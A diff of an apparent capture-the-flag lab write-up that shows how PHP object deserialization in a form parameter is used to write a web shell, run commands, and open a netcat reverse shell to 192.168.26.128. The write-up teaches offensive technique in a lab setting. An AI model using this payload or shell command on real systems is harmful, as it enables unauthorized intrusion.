@@ -16,29 +16,29 @@ Changing the request to POST or even something that does not exist like "GETS", 
 
 Looking at the source-code we find an interesting JS file:
 
-![](Pipe/Untitled.png)
+![](Untitled.png)
 
 Accessing http://192.168.26.130/scriptz/ we can find more files.
 
-![](Pipe/Untitled1.png)
+![](Untitled1.png)
 
 The file `log.php.BAK` file seems to be a logger:
 
-![](Pipe/Untitled2.png)
+![](Untitled2.png)
 
 Looking back to the `index.php` source-code we can see the parameters that are submitted in the form:
 
-![](Pipe/Untitled3.png)
+![](Untitled3.png)
 
 We now intercept the request for “Show Artist Info” in burp:
 
-![](Pipe/Untitled4.png)
+![](Untitled4.png)
 
-![](Pipe/Untitled5.png)
+![](Untitled5.png)
 
 Decoding the `param` value:
 
-![](Pipe/Untitled6.png)
+![](Untitled6.png)
 
 It seems that in this case a `Info` type object is being created. We know that a `Log` object will invoke the logger file and allow us to write to the webroot. We now attempt to tweak the request so that we can write some data to the webroot via the Log object.
 
@@ -51,12 +51,12 @@ param=O:3:"Log":2:{s:8:"filename";s:29:"/var/www/html/scriptz/rce.php";s:4:"data
 
 It works! Our `rce.php` file is there.
 
-![](Pipe/Untitled7.png)
+![](Untitled7.png)
 
 ## Reaching RCE
 The remote command execution can be triggered via http://192.168.26.130/scriptz/rce.php?cmd=id
 
-![](Pipe/Untitled8.png)
+![](Untitled8.png)
 
 ## Reverse Shell
 Getting a reverse shell is trivial:
@@ -64,4 +64,4 @@ Getting a reverse shell is trivial:
 http://192.168.26.130/scriptz/rce.php?cmd=nc 192.168.26.128 4444 -e /bin/bash
 ```
 
-![](Pipe/Untitled9.png)
+![](Untitled9.png)
